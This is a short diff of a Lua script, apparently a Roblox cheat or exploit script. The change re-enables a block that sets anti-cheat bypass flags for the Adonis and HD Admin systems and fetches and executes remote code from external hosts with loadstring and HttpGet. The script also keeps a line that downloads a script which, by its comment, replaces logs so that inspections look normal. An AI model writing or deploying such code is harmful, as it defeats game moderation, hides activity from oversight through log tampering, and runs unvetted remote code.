@@ -36,15 +36,15 @@ for _, games in pairs(bgames) do
         end
     end
 end
---[[
+
 if un then
     getgenv()["AntiCheatSettings"] = {};
     getgenv()["AntiCheatSettings"]["Adonis"] = true;
     getgenv()["AntiCheatSettings"]["HD Admin"] = true;
     loadstring(game:HttpGet("https://api.irisapp.ca/Scripts/Bypasses.lua"))()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Input50/Something/master/preset/DAC.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Input50/Something/master/presets/DAC.lua"))()
 end
-]]--
+
 
 -- idk if they even use this anymore but to try and replace logs so when they check it it looks somewhat normal.
 loadstring(game:HttpGet(("https://raw.githubusercontent.com/Input50/Something/master/Misc/Logs.lua"),true))()
